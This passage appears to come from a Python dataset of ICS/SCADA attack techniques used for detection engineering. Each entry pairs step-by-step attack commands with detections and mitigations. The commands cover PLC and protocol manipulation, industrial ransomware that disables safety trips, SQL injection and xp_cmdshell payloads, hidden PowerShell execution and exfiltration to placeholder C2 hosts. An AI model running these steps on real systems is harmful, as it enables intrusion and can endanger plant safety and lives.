            "Anomalous data values passing through gateway (translation errors)",
        ],
        "mitigations": [
            "Disable gateway web management from IT network per IEC 62443",
            "Strong authentication on gateway management interfaces",
            "Network segmentation isolating gateway management from IT",
            "Regular gateway firmware updates and security patches",
            "Protocol translation integrity monitoring and validation",
        ],
    },
    {
        "category": "scada",
        "name": "OPC DA (Classic) DCOM Exploitation",
        "mitre_ids": ["T0831"],
        "desc": "Exploiting OPC Data Access (Classic) DCOM interfaces for unauthorized data access and manipulation in legacy SCADA systems per NIST SP 800-82.",
        "steps": "1. Discover OPC DA servers: `python3 opc_enum.py --subnet <subnet>` enumerates DCOM OPC servers\n2. Enumerate OPC DA items: `python3 opc_enum_items.py --server <target> --progid 'Matrikon.OPC.Simulation'\n3. Connect to OPC DA: `python3 -c \"import OpenOPC; opc=OpenOPC.client(); opc.connect('Matrikon.OPC.Simulation.1', '<target>')\"`\n4. Read tags: `opc.read(('Simulation.Random', 'Simulation.Sawtooth'))`\n5. Write tags: `opc.write(('Simulation.Random', 999))` (modify process values)\n6. Exploit DCOM: `python3 dcom_exploit.py --target <opc_server> --clsid '{13486D33-4829-4B25-A8B0-3364C9C6A724}'`\n7. DCOM authentication bypass: exploit weak DCOM permissions to escalate from OPC read to OPC write",
        "detection": [
            "DCOM activation requests from non-OT sources",
            "OPC DA connections from unauthorized client IPs",
            "OPC write operations outside maintenance windows",
            "DCOM permission modification events",
            "Unusual OPC tag subscription patterns",
        ],
        "mitigations": [
            "Migrate from OPC DA to OPC UA with encryption and authentication per IEC 62443",
            "DCOM permission hardening and access control",
            "Network segmentation for OPC DA servers",
            "OPC gateway with authentication and logging",
            "Regular DCOM security audits per NIST SP 800-82",
        ],
    },
    # === INDUSTRIAL RANSOMWARE ===
    {
        "category": "ransomware",
        "name": "Industrial Ransomware - EKANS Variant",
        "mitre_ids": ["T1486"],
        "desc": "Ransomware specifically designed to target ICS/SCADA systems and kill industrial processes.",
        "steps": '1. Initial access: phishing or VPN compromise to IT network\n2. Lateral movement: pivot from IT to OT network via shared infrastructure\n3. Identify ICS processes: `tasklist | findstr /i "scada hmi plc historian"`\n4. Kill ICS processes: `taskkill /F /IM scada_runtime.exe`\n5. Encrypt files: target .mwp (PLC programs), .dat (historian data), .db (SCADA databases)\n6. Delete shadow copies: `vssadmin delete shadows /all /quiet`\n7. Drop ransom note targeting operational technology staff\n8. EKANS-specific: kills processes with names matching ICS software vendors',
        "detection": [
            "ICS process termination events",
            "File encryption of .mwp, .dat, .db extensions",
            "Shadow copy deletion",
            "Known ransomware IOCs in OT network",
            "Process killing matching ICS vendor names",
        ],
        "mitigations": [
            "IT/OT network segmentation",
            "Offline backups of PLC programs and historian data",
            "Application whitelisting on HMI/SCADA systems",
            "Endpoint detection for ICS processes",
            "Regular backup testing and verification",
        ],
    },
    {
        "category": "ransomware",
        "name": "OT-Specific Ransomware - Process Manipulation",
        "mitre_ids": ["T1486"],
        "desc": "Ransomware that manipulates industrial processes rather than just encrypting data.",
        "steps": "1. Gain access to HMI/SCADA workstation\n2. Identify process control capabilities: setpoint adjustments, alarm configuration\n3. Modify process setpoints to unsafe values: increase temperature setpoint beyond safe limits\n4. Disable alarms: suppress all process alarms\n5. Lock out operators: change HMI passwords, disable remote access\n6. Demand ransom for: process restoration, alarm re-enablement, password restoration\n7. Threat: continued unsafe operation will cause physical damage",
        "detection": [
            "Unauthorized setpoint changes",
            "Alarm suppression events",
            "HMI password changes outside maintenance",
            "Multiple process parameter changes in short period",
            "Physical safety system activation",
        ],
        "mitigations": [
            "Hardwired safety systems (SIS) independent of SCADA",
            "Process variable validation limits in PLCs",
            "Alarm management policies",
            "HMI access control and auditing",
            "Physical kill switches for critical processes",
        ],
    },
    {
        "category": "ransomware",
        "name": "ICS Ransomware with Safety System Targeting",
        "mitre_ids": ["T1486", "T0831"],
        "desc": "Ransomware specifically targeting Safety Instrumented Systems to disable physical protection layers per MITRE ATT&CK ICS and IEC 62443.",
        "steps": "1. Initial access: phishing, VPN compromise, or supply chain attack\n2. Lateral movement: pivot from IT to OT, identify SIS network segment\n3. Enumerate SIS: `nmap -sT -p 102,44818 <sis_subnet>` (separate from BPCS)\n4. Compromise SIS workstation: exploit weak authentication on engineering workstation\n5. Upload ransomware to SIS: `python3 upload_payload.py --target <sis_ews> --payload ics_ransomware_sis.exe`\n6. Execute: `ics_ransomware_sis.exe --mode safety-target --encrypt-sis-programs --disable-trips`\n7. Encrypt SIS program files: .mwp, .L5X, .scl files containing safety interlock logic\n8. Disable safety trips: modify SIS output modules to prevent trip actions\n9. Demand ransom: threaten that safety systems are disabled and physical damage imminent",
        "detection": [
            "SIS program file encryption events",
            "SIS workstation process execution anomalies",
            "Safety system communication failures",
            "SIS output module configuration changes",
            "Ransomware IOCs on SIS engineering workstation",
        ],
        "mitigations": [
            "Air-gapped SIS networks per IEC 61511",
            "Hardwired safety interlocks independent of SIS PLC logic",
            "Offline backups of SIS programs with integrity verification",
            "Application whitelisting on SIS engineering workstations per IEC 62443",
            "Physical safety system monitoring independent of digital SIS",
        ],
    },
    {
        "category": "ransomware",
        "name": "ICS Ransomware with Process Manipulation (Stuxnet-like)",
        "mitre_ids": ["T0831", "T0859"],
        "desc": "Advanced ICS malware that manipulates process while falsifying sensor data to operators, emulating Stuxnet-style techniques for detection engineering per MITRE ATT&CK ICS.",
        "steps": "1. Initial access: USB propagation or supply chain compromise of engineering workstation\n2. Identify target PLC: fingerprint PLC type and process role: `python3 plc_fingerprint.py --ip <target>`\n3. Deploy rootkit: inject code to intercept PLC I/O: `python3 ics_rootkit_deploy.py --target <plc_ip> --mode io-intercept`\n4. Manipulate process: modify PLC logic to drive process to unsafe state (increase centrifuge speed, raise reactor temperature)\n5. Falsify sensor data: rootkit intercepts read requests and returns normal values to HMI: `python3 ics_rootkit_config.py --target <plc_ip> --fake-sensors temp=200,pressure=50`\n6. Disable safety alarms: suppress alarm thresholds in SIS: `python3 ics_rootkit_config.py --target <plc_ip> --suppress-alarms`\n7. Monitor: `python3 ics_rootkit_monitor.py --target <plc_ip>` to verify HMI shows normal while process is unsafe",
        "detection": [
            "PLC program hash changes without maintenance records",
            "Discrepancy between field instrument readings and HMI displayed values",
            "Unexpected PLC scan time increases (rootkit processing overhead)",
            "Safety system activation despite HMI showing normal conditions",
            "Network traffic anomalies: PLC communication patterns changing",
        ],
        "mitigations": [
            "Independent safety instrumented systems (SIS) per IEC 61511",
            "Physical process variable monitoring independent of digital systems",
            "PLC program integrity verification with hash comparison per IEC 62443",
            "Diverse sensor validation: compare digital readings with local gauges",
            "Network anomaly detection for PLC communication patterns",
        ],
    },
    {
        "category": "ransomware",
        "name": "ICS Ransomware with HMI Lockout",
        "mitre_ids": ["T0799", "T1486"],
        "desc": "Ransomware that locks operators out of HMI systems while continuing process manipulation for adversary emulation per NIST SP 800-82.",
        "steps": "1. Compromise HMI workstation via phishing or vulnerability exploitation\n2. Escalate privileges: `privilege_escalate.exe --target hmi_workstation`\n3. Modify HMI startup: replace legitimate HMI executable with ransomware: `copy ics_lockout.exe C:\\ProgramData\\SCADA\\hmi_runtime.exe`\n4. Lock HMI display: `ics_lockout.exe --mode fullscreen-lockout --message 'SYSTEM LOCKED - CONTACT ADMIN'`\n5. Disable keyboard/mouse: filter driver intercepts input devices\n6. Continue process via backend: while HMI is locked, ransomware modifies PLC setpoints: `python3 plc_manipulate.py --target <plc_ip> --setpoint temp=999`\n7. Demand ransom: display ransom note on locked HMI screen\n8. Persistence: modify registry to start lockout on boot",
        "detection": [
            "HMI process replacement or modification",
            "Full-screen lockout screen on HMI displays",
            "HMI startup registry modifications",
            "Input device filter driver installation",
            "PLC setpoint changes during HMI lockout period",
        ],
        "mitigations": [
            "HMI application whitelisting per IEC 62443",
            "Physical HMI override switches (hardwired emergency stops)",
            "Redundant HMI with independent access paths",
            "HMI integrity monitoring and change detection",
            "Network-based process monitoring independent of HMI per NIST SP 800-82",
        ],
    },
    # === OT PROTOCOL ===
    {
        "category": "ot_protocol",
        "name": "EtherNet/IP CIP Protocol Exploitation",
        "mitre_ids": ["T0831"],
        "desc": "Exploiting the Common Industrial Protocol over EtherNet/IP to manipulate ControlLogix PLCs.",
        "steps": "1. Discover EtherNet/IP devices: `nmap -sU -p 44818 --script enip-info <target>`\n2. Enumerate CIP services: `python3 cip_scan.py --ip <target>`\n3. Read PLC tag: `python3 -c \"from pylogix import PLC; p=PLC(); p.IPAddress='<target>'; print(p.Read('Temperature_Setpoint'))\"`\n4. Write PLC tag: `p.Write('Temperature_Setpoint', 999)`\n5. Modify controller: `python3 cip_controller_modify.py --ip <target> --mode program`\n6. Download new logic: inject modified ladder logic",
        "detection": [
            "CIP traffic from non-OT sources",
            "Tag writes to safety-critical variables",
            "Controller mode changes outside maintenance",
            "EtherNet/IP enumeration patterns",
        ],
        "mitigations": [
            "CIP Security with authentication",
            "Network segmentation for EtherNet/IP devices",
            "PLC key switch in RUN mode (physical protection)",
            "Tag-level write protection",
            "CIP-aware IDS monitoring",
        ],
    },
    {
        "category": "ot_protocol",
        "name": "S7comm Protocol Exploitation (Siemens S7)",
        "mitre_ids": ["T0832"],
        "desc": "Exploiting Siemens S7comm protocol for PLC control and data manipulation.",
        "steps": "1. Discover S7 PLCs: `nmap -sT -p 102 --script s7-info <target>`\n2. Enumerate PLC: `python3 snap7_info.py --ip <target>`\n3. Read DB block: `python3 snap7_read_db.py --ip <target> --db 1 --start 0 --size 256`\n4. Write to DB: `python3 snap7_write_db.py --ip <target> --db 1 --offset 10 --value 32767`\n5. Control PLC: `python3 s7_plc_control.py --ip <target> --stop` then `--start`\n6. Extract password: `python3 s7_password_crack.py --ip <target>`",
        "detection": [
            "S7comm traffic from non-OT network",
            "PLC STOP/START commands from unauthorized sources",
            "DB block read/write outside operational patterns",
            "S7 password cracking attempts",
        ],
        "mitigations": [
            "S7comm password protection on PLCs",
            "Communication security level configuration",
            "Network segmentation (firewall on port 102)",
            "PLC access protection level configuration",
            "Regular PLC program integrity verification",
        ],
    },
    {
        "category": "ot_protocol",
        "name": "OPC UA Protocol Security Assessment",
        "mitre_ids": ["T0831"],
        "desc": "Assessing and exploiting OPC UA protocol implementations in industrial systems.",
        "steps": "1. Discover OPC UA servers: `python3 opcua_discovery.py --subnet <subnet>`\n2. Connect to server: `python3 -c \"from opcua import Client; c=Client('opc.tcp://<target>:4840'); c.connect()\"`\n3. Browse nodes: `root = c.get_root_node(); for child in root.get_children(): print(child)`\n4. Read variables: `temp = c.get_node('ns=2;s=Temperature'); print(temp.get_value())`\n5. Write variables: `temp.set_value(999)` (set temperature to dangerous level)\n6. Call methods: `c.get_node('ns=2;s=StartPump').call_method()`",
        "detection": [
            "OPC UA discovery from non-OT sources",
            "Node writes to safety-critical variables",
            "Method calls on process control objects",
            "Certificate authentication failures",
        ],
        "mitigations": [
            "OPC UA Security Mode: SignAndEncrypt",
            "Certificate-based authentication",
            "Fine-grained access control (node-level)",
            "OPC UA Gateway with application-level firewall",
            "Regular certificate rotation",
        ],
    },
    {
        "category": "ot_protocol",
        "name": "BACnet Protocol Exploitation",
        "mitre_ids": ["T0831"],
        "desc": "Exploiting BACnet protocol in building automation and industrial control systems for vulnerability assessment per MITRE ATT&CK ICS.",
        "steps": "1. Discover BACnet devices: `nmap -sU -p 47808 --script bacnet-info <target>`\n2. Enumerate BACnet objects: `python3 bacnet_scan.py --ip <target> --port 47808`\n3. Read BACnet properties: `python3 bacnet_read.py --ip <target> --object analogInput --instance 1 --property presentValue`\n4. Write BACnet properties: `python3 bacnet_write.py --ip <target> --object analogOutput --instance 1 --property presentValue --value 100`\n5. Exploit BACnet broadcast: `python3 bacnet_broadcast.py --type whoIs --range 0-4194303` (enumerate all devices)\n6. Manipulate HVAC: change temperature setpoints, disable fire suppression: `python3 bacnet_write.py --ip <target> --object analogValue --instance 10 --property presentValue --value 0`\n7. BACnet device fingerprinting: extract vendor, model, firmware from device objects",
        "detection": [
            "BACnet traffic from non-BAS network sources",
            "BACnet Who-Is broadcasts from unauthorized devices",
            "Write commands to safety-critical BACnet objects (fire, HVAC)",
            "BACnet device enumeration scanning patterns",
            "Anomalous BACnet presentValue changes",
        ],
        "mitigations": [
            "BACnet/SC (Secure Connect) with TLS and authentication per IEC 62443",
            "Network segmentation for BACnet devices",
            "BACnet-aware firewall filtering write commands",
            "Static BACnet device tables limiting accepted commands",
            "BACnet traffic monitoring and anomaly detection per NIST SP 800-82",
        ],
    },
    {
        "category": "ot_protocol",
        "name": "PROFINET Protocol Exploitation",
        "mitre_ids": ["T0831"],
        "desc": "Exploiting PROFINET RT/IRT protocol in manufacturing and process automation for vulnerability assessment per MITRE ATT&CK ICS.",
        "steps": "1. Discover PROFINET devices: `python3 profinet_discover.py --interface eth0` (uses DCP protocol)\n2. Enumerate device properties: `python3 profinet_dcp.py --ip <target> --read-all`\n3. Read device name: `python3 profinet_dcp.py --ip <target> --read NameOfStation`\n4. Write device name (impersonation): `python3 profinet_dcp.py --ip <target> --write NameOfStation=attacker_device`\n5. PROFINET RT frame injection: `python3 profinet_inject.py --interface eth0 --target <plc_ip> --frame rt --data f0000001`\n6. Exploit DCP factory reset: `python3 profinet_dcp.py --ip <target> --factory-reset` (resets device to defaults)\n7. PROFINET IRT timing attack: inject delayed IRT frames to disrupt real-time communication",
        "detection": [
            "PROFINET DCP requests from unauthorized MAC addresses",
            "Device name changes in PROFINET network",
            "Unexpected PROFINET RT frame injection",
            "Factory reset commands on PROFINET devices",
            "IRT timing anomalies in real-time communication",
        ],
        "mitigations": [
            "PROFINET Security with TLS and authentication per IEC 62443",
            "Network segmentation for PROFINET devices",
            "DCP filter limiting configuration changes per NIST SP 800-82",
            "PROFINET-aware IDS monitoring DCP and RT frames",
            "Device authentication via PROFINET profile",
        ],
    },
    {
        "category": "ot_protocol",
        "name": "MQTT Broker Exploitation in IoT/ICS",
        "mitre_ids": ["T0831"],
        "desc": "Exploiting MQTT brokers used in IoT-connected ICS environments for unauthorized data access and control per MITRE ATT&CK ICS.",
        "steps": "1. Discover MQTT brokers: `nmap -sT -p 1883,8883 <subnet>` (MQTT and MQTT/TLS ports)\n2. Test anonymous access: `mosquitto_sub -h <target> -p 1883 -t '#'` (subscribe to all topics)\n3. Enumerate topics: `python3 mqtt_enum.py --host <target> --port 1883 --subscribe '#'\n4. Read sensor data: `mosquitto_sub -h <target> -p 1883 -t 'factory/sensor/+/temperature'`\n5. Publish malicious commands: `mosquitto_pub -h <target> -p 1883 -t 'factory/actuator/pump01/setpoint' -m '999'`\n6. Exploit weak ACLs: publish to control topics normally restricted to SCADA\n7. Persistent access: create subscription to all topics for ongoing reconnaissance",
        "detection": [
            "MQTT connections from unauthorized IP addresses",
            "MQTT wildcard subscriptions (topic '#')",
            "Publish commands to control topics from non-SCADA sources",
            "MQTT anonymous authentication attempts",
            "MQTT topic enumeration patterns",
        ],
        "mitigations": [
            "MQTT broker authentication and authorization per IEC 62443",
            "MQTT TLS encryption (port 8883)",
            "Topic-level ACLs restricting publish/subscribe permissions",
            "Network segmentation isolating MQTT broker from IT network",
            "MQTT intrusion detection monitoring topic access patterns per NIST SP 800-82",
        ],
    },
    {
        "category": "ot_protocol",
        "name": "IEC 61850 GOOSE Message Injection",
        "mitre_ids": ["T0831"],
        "desc": "Injecting forged GOOSE messages in IEC 61850 substations for tripping breakers and manipulating protection relays during vulnerability assessment per MITRE ATT&CK ICS.",
        "steps": "1. Capture GOOSE traffic: `tcpdump -i eth0 -c 100 ether proto 0x88B8 -w goose.pcap`\n2. Analyze GOOSE messages: `python3 goose_parse.py --pcap goose.pcap`\n3. Identify target GOOSE ID: extract GOOSE ID, dataset, and sequence numbers\n4. Craft forged GOOSE message: `python3 goose_inject.py --interface eth0 --goose-id 'LLN0$GO$gcbTrip' --dataset 'DSTrip' --stNum 1 --sqNum 0 --value TRUE`\n5. Inject trip command: send GOOSE with breaker trip state change\n6. Race legitimate GOOSE: inject with higher stNum/sqNum to override real messages\n7. Verify: monitor breaker status via MMS to confirm trip: `python3 iec61850_mms_read.py --ip <target> --ln LLN0 --data Trip`\n8. Document per IEC 61850 security assessment methodology",
        "detection": [
            "GOOSE messages from unauthorized source MAC addresses",
            "GOOSE stNum/sqNum sequence anomalies (unexpected resets)",
            "Duplicate GOOSE ID from different source",
            "GOOSE message injection during normal operation",
            "Time synchronization anomalies affecting GOOSE timing",
        ],
        "mitigations": [
            "IEC 61850 Edition 2 with GOOSE security (digital signatures) per IEC 62351-6",
            "Network segmentation with VLAN for GOOSE traffic per IEC 62443",
            "GOOSE message authentication and integrity checking",
            "Static MAC address tables for GOOSE publishers per NERC CIP",
            "GOOSE monitoring systems detecting unauthorized publishers",
        ],
    },
    {
        "category": "ot_protocol",
        "name": "DNP3 Master Impersonation",
        "mitre_ids": ["T0831"],
        "desc": "Impersonating a DNP3 master station to send unauthorized control commands to outstations for vulnerability assessment per MITRE ATT&CK ICS and NIST SP 800-82.",
        "steps": "1. Discover DNP3 outstations: `nmap -sT -p 20000 <subnet>`\n2. Capture DNP3 master traffic: `tcpdump -i eth0 -c 100 port 20000 -w dnp3.pcap`\n3. Analyze DNP3 frames: `python3 dnp3_parse.py --pcap dnp3.pcap --extract master-address`\n4. Identify master address: typically 1, identify outstation address range\n5. Craft impersonation: `python3 dnp3_impersonate.py --src-addr 1 --dst-addr 10 --ip <outstation_ip>`\n6. Send control commands: `python3 dnp3_control.py --master 1 --outstation 10 --ip <target> --control SBO --point 0 --value ON`\n7. Modify analog output: `python3 dnp3_write.py --ip <target> --group 41 --variation 1 --point 0 --value 0xFFFF`",
        "detection": [
            "DNP3 traffic from unrecognized master addresses",
            "DNP3 control commands outside scheduled polling",
            "Duplicate master address on DNP3 network",
            "DNP3 Secure Authentication challenge failures",
            "Unusual DNP3 function codes from new source IPs",
        ],
        "mitigations": [
            "DNP3 Secure Authentication (SA) v5 per IEEE 1815-2012",
            "DNP3 master address whitelisting on outstations",
            "Network segmentation for DNP3 devices per IEC 62443",
            "DNP3-aware IDS monitoring master-outstation communication",
            "Multi-factor authentication for DNP3 control commands per NIST SP 800-82",
        ],
    },
    # === ADDITIONAL VARIATIONS ===
    {
        "category": "modbus",
        "name": "Modbus/TCP Mass Register Read (Data Exfiltration)",
        "mitre_ids": ["T0802"],
        "desc": "Reading large numbers of Modbus registers to exfiltrate process data and map the industrial process.",
        "steps": "1. Connect to Modbus device: `c = ModbusTcpClient('<target>', port=502)`\n2. Read all holding registers (0-65535): `for i in range(0, 65535, 125): result = c.read_holding_registers(i, 125, unit=1)`\n3. Read all input registers: `for i in range(0, 65535, 125): result = c.read_input_registers(i, 125, unit=1)`\n4. Map process variables: correlate register values with process documentation\n5. Identify setpoints, alarms, and safety limits from register values\n6. Exfiltrate: `python3 modbus_dump.py --ip <target> --output process_map.json`",
        "detection": [
            "Mass register reads across entire address space",
            "Modbus traffic volume exceeding normal patterns",
            "Data exfiltration patterns from OT network",
            "Register reads from non-OT IP addresses",
        ],
        "mitigations": [
            "Modbus firewall limiting register read ranges",
            "Network monitoring for mass data transfers",
            "Register access logging",
            "Process variable encryption where supported",
        ],
    },
    {
        "category": "plc",
        "name": "PLC Memory Protection Bypass",
        "mitre_ids": ["T0832"],
        "desc": "Bypassing PLC memory protection mechanisms to modify running logic.",
        "steps": "1. Identify protection level: `python3 s7_get_protection.py --ip <target>`\n2. Try default passwords: common PLC passwords (system, password, 0000, 1234)\n3. Brute force: `python3 s7_brute.py --ip <target> --wordlist passwords.txt`\n4. Exploit known vulnerabilities: use PLC-specific exploits for firmware bugs\n5. Memory protection bypass via JTAG: physical access to PLC board\n6. Or: exploit PLC web server authentication bypass",
        "detection": [
            "PLC authentication attempts from non-standard IPs",
            "Multiple failed PLC login attempts",
            "Protection level change events",
            "Firmware update outside maintenance windows",
        ],
        "mitigations": [
            "Strong PLC passwords (not defaults)",
            "Memory protection level 3 (full protection)",
            "Physical security for PLC cabinets",
            "Network access control for PLC programming ports",
            "Regular password rotation",
        ],
    },
    # === HMI ATTACKS ===
    {
        "category": "hmi_attack",
        "name": "HMI Authentication Bypass",
        "mitre_ids": ["T0799"],
        "desc": "Bypassing HMI authentication mechanisms to gain unauthorized access to SCADA process control screens for vulnerability assessment per MITRE ATT&CK ICS.",
        "steps": "1. Identify HMI type and version: `nmap -sV -p 80,443,8080,3389 <target>` and `curl -k https://<target>/` check headers\n2. Check for default credentials: admin:admin, operator:operator, siemens:siemens\n3. Test authentication bypass: `curl -k https://<target>/main.html --cookie 'session=bypass'`\n4. Exploit session fixation: reuse session tokens from previous logins\n5. Test URL path traversal: `curl -k https://<target>/../../etc/passwd`\n6. Exploit HMI-specific bypass: some HMIs accept any password when configured for 'remote access'\n7. SQL injection on login: `curl -k -X POST https://<target>/login -d 'user=admin&pass=OR+1%3D1--'`\n8. Access process control: navigate to setpoint modification screens after bypass",
        "detection": [
            "Successful authentication with invalid or empty credentials",
            "Session tokens reused from different IP addresses",
            "Authentication bypass attempts in HMI application logs",
            "URL path traversal attempts in HMI web server logs",
            "SQL injection patterns in HMI login form submissions",
        ],
        "mitigations": [
            "Multi-factor authentication on all HMI systems per IEC 62443",
            "Session management with short timeouts and rotation",
            "Input validation on all HMI authentication forms",
            "Network segmentation restricting HMI access per NIST SP 800-82",
            "Regular HMI software updates and security patches",
        ],
    },
    {
        "category": "hmi_attack",
        "name": "HMI Remote Code Execution via ActiveX",
        "mitre_ids": ["T0859"],
        "desc": "Exploiting ActiveX controls in legacy HMI web interfaces for remote code execution on SCADA workstations per MITRE ATT&CK ICS.",
        "steps": "1. Identify legacy HMI with ActiveX: check for .cab or .ocx file references in HMI web pages\n2. Enumerate ActiveX controls: `curl -k https://<target>/ | grep -i 'classid\\|object'`\n3. Download ActiveX control: `curl -k -O https://<target>/controls/hmi_control.cab`\n4. Reverse engineer: `oleview hmi_control.ocx` to find vulnerable methods\n5. Find buffer overflow: `python3 activex_fuzz.py --control hmi_control.ocx --method ProcessTag`\n6. Craft exploit: `python3 activex_exploit.py --target <hmi_ip> --control hmi_control.ocx --method ProcessTag --payload reverse_shell`\n7. Deliver: host exploit page, trick operator into visiting via phishing: `python3 http_server.py --port 8080 --exploit activex_exploit.html`",
        "detection": [
            "ActiveX control exploitation attempts in browser logs",
            "Unexpected process execution from HMI web browser",
            "ActiveX control buffer overflow crash dumps",
            "Malicious HTML pages with ActiveX object tags",
            "Unusual outbound connections from HMI workstation",
        ],
        "mitigations": [
            "Migrate from ActiveX-based HMI to modern HTML5 per IEC 62443",
            "Application whitelisting on HMI workstations per NIST SP 800-82",
            "Disable ActiveX in browser security zones on HMI workstations",
            "Network segmentation preventing HMI workstations from accessing internet",
            "Regular vulnerability scanning and patching of ActiveX controls",
        ],
    },
    {
        "category": "hmi_attack",
        "name": "HMI SQL Injection via Tag Names",
        "mitre_ids": ["T0859"],
        "desc": "Exploiting SQL injection vulnerabilities in HMI tag name processing for unauthorized database access per MITRE ATT&CK ICS and NIST SP 800-82.",
        "steps": "1. Identify HMI with database backend: `nmap -sV -p 1433,3306,5432 <target>` (SQL Server, MySQL, PostgreSQL)\n2. Find tag input fields: navigate HMI web interface to tag configuration pages\n3. Test SQL injection in tag name: enter `'; SELECT * FROM users;--` in tag name field\n4. Confirm injection: `UNION SELECT 1,username,password,4,5 FROM users--` in tag name\n5. Extract credentials: `'; EXEC xp_cmdshell 'cmd.exe /c whoami';--` (SQL Server)\n6. Access SCADA database: `UNION SELECT 1,tag_name,tag_value,4,5 FROM scada_tags--`\n7. Modify process values: `UPDATE scada_tags SET value=999 WHERE tag_name='Temperature_Setpoint'--`",
        "detection": [
            "SQL injection patterns in HMI application logs",
            "Unexpected database queries from HMI application",
            "Database error messages in HMI responses",
            "Unauthorized database access from HMI web interface",
            "HMI tag name fields containing SQL keywords",
        ],
        "mitigations": [
            "Parameterized queries for all HMI tag name operations per IEC 62443",
            "Input validation and sanitization on all HMI input fields",
            "Database access through stored procedures only",
            "Web Application Firewall (WAF) for HMI interfaces per NIST SP 800-82",
            "Regular SQL injection testing and code review",
        ],
    },
    {
        "category": "hmi_attack",
        "name": "HMI Screenshot Scraping for Reconnaissance",
        "mitre_ids": ["T0846"],
        "desc": "Automated screenshot scraping of HMI displays to gather process intelligence and operator interface information for adversary emulation per MITRE ATT&CK ICS.",
        "steps": "1. Gain access to HMI: via compromised operator workstation or remote desktop\n2. Install screenshot tool: `pip install pillow pyautogui`\n3. Automated screenshot capture: `python3 hmi_scrape.py --interval 60 --output hmi_screenshots/ --display :0`\n4. OCR processing: `python3 ocr_process.py --input hmi_screenshots/ --output hmi_text/` (extract text from screenshots)\n5. Extract process data: `python3 process_extract.py --input hmi_text/ --patterns 'temperature|pressure|flow|level|setpoint'`\n6. Map process: correlate extracted values with process understanding\n7. Identify safety limits: extract alarm setpoints and safety thresholds from displayed values\n8. Exfiltrate: `python3 exfil_data.py --input hmi_text/ --server <c2_host> --port 443`",
        "detection": [
            "Screenshot capture processes running on HMI workstation",
            "Automated GUI interaction tools (pyautogui, Sikuli) on HMI",
            "Unusual OCR software installation on HMI workstation",
            "Large volume of image files in unusual directories",
            "Data exfiltration from HMI workstation to external network",
        ],
        "mitigations": [
            "Application whitelisting on HMI workstations per IEC 62443",
            "Restrict remote desktop access to HMI systems per NIST SP 800-82",
            "Monitor and alert on screenshot capture processes",
            "Network segmentation preventing data exfiltration from OT",
            "DLP (Data Loss Prevention) monitoring on HMI workstation",
        ],
    },
    {
        "category": "hmi_attack",
        "name": "HMI Configuration File Theft",
        "mitre_ids": ["T0802"],
        "desc": "Stealing HMI configuration files containing tag databases, screen layouts, and connection strings for reconnaissance per MITRE ATT&CK ICS.",
        "steps": "1. Identify HMI configuration paths: common locations include C:\\ProgramData\\[Vendor]\\, /opt/[vendor]/, /var/lib/scada/\n2. Enumerate configuration files: `dir /s /b C:\\*.mwf C:\\*.app C:\\*.svg C:\\*.xml C:\\*.ini` on Windows HMI\n3. Locate tag database: `find /opt -name '*.tag' -o -name '*tags*.xml' -o -name '*tag_db*' 2>/dev/null`\n4. Extract connection strings: `grep -r 'ConnectionString\\|Server=\\|Data Source=' /opt/scada/ 2>/dev/null`\n5. Download configuration: `python3 hmi_config_download.py --target <hmi_ip> --path /opt/scada/config/ --output hmi_config/`\n6. Parse tag database: extract PLC addresses, setpoints, alarm limits from configuration\n7. Exfiltrate: compress and transfer to attacker: `tar czf hmi_config.tar.gz hmi_config/ && python3 exfil.py --file hmi_config.tar.gz --server <c2>`",
        "detection": [
            "Large file transfers from HMI workstation",
            "Access to HMI configuration directories by non-standard processes",
            "Archive creation (zip, tar) on HMI workstation",
            "Exfiltration of configuration files to external network",
            "Access to HMI configuration files outside maintenance windows",
        ],
        "mitigations": [
            "Encrypt HMI configuration files at rest per IEC 62443",
            "Access control lists on HMI configuration directories",
            "File integrity monitoring on HMI configuration files",
            "Network segmentation preventing configuration exfiltration per NIST SP 800-82",
            "Regular audits of HMI configuration file access",
        ],
    },
    # === ENGINEERING WORKSTATION ===
    {
        "category": "engineering_workstation",
        "name": "Engineering Workstation Compromise via USB",
        "mitre_ids": ["T0856"],
        "desc": "Compromising engineering workstations through USB devices for initial access to OT networks per MITRE ATT&CK ICS.",
        "steps": "1. Prepare USB payload: `python3 usb_payload.py --type rubber-ducky --payload ews_backdoor.ps1 --output payload.dd`\n2. Social engineering: leave USB in facility parking lot labeled 'PLC Program Updates'\n3. Alternatively: compromise legitimate USB device with firmware-level malware\n4. Auto-execution: `powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File ews_backdoor.ps1`\n5. Establish C2: `python3 c2_connect.py --server <c2_host> --port 443 --protocol https`\n6. Enumerate EWS software: `wmic product get name | findstr /i 'tia\\|rslogix\\|wincc\\|ignition'`\n7. Locate PLC programs: `dir /s /b C:\\Users\\*.mwp C:\\Users\\*.L5X C:\\Users\\*.awp`\n8. Pivot: use EWS network access to reach PLCs on OT network",
        "detection": [
            "USB device insertion events on EWS",
            "Auto-run execution from USB devices",
            "PowerShell execution from USB paths",
            "New C2 connections from EWS workstation",
            "USB mass storage device events on air-gapped systems",
        ],
        "mitigations": [
            "Disable USB auto-run on all EWS per IEC 62443",
            "USB device whitelisting allowing only authorized devices",
            "Physical security preventing unauthorized USB access per NERC CIP",
            "Endpoint detection and response on EWS workstations",
            "Network segmentation limiting EWS connectivity per NIST SP 800-82",
        ],
    },
    {
        "category": "engineering_workstation",
        "name": "EWS Software Exploitation (TIA Portal, RSLogix)",
        "mitre_ids": ["T0859"],
        "desc": "Exploiting vulnerabilities in engineering workstation software (TIA Portal, RSLogix, Unity Pro) for OT network access per MITRE ATT&CK ICS.",
        "steps": "1. Identify EWS software: `wmic product get name | findstr /i 'tia\\|rslogix\\|unity\\|wincc'`\n2. Enumerate versions: `reg query 'HKLM\\SOFTWARE\\Siemens\\TIA Portal' /v Version 2>nul`\n3. Search CVEs: identify vulnerabilities in TIA Portal v16-v18, RSLogix 5000, Unity Pro\n4. Common EWS vulnerabilities: project file parsing bugs, DLL side-loading, privilege escalation\n5. Exploit DLL side-loading: place malicious DLL in TIA Portal directory: `copy evil.dll 'C:\\Program Files\\Siemens\\Automation\\TIA Portal\\V18\\evil.dll'`\n6. Craft malicious project file: `python3 ews_exploit.py --type tia-portal --payload reverse_shell --output malicious_project.zap18`\n7. Deliver via phishing: send malicious project file to engineer\n8. Execution: when engineer opens project file, payload executes with EWS privileges",
        "detection": [
            "EWS software crashing or unusual behavior from malicious files",
            "DLL side-loading events in EWS software directories",
            "Unexpected network connections from EWS processes",
            "EWS process spawning unexpected child processes",
            "Project file execution from unusual paths (email, downloads)",
        ],
        "mitigations": [
            "EWS software kept up to date with security patches per IEC 62443",
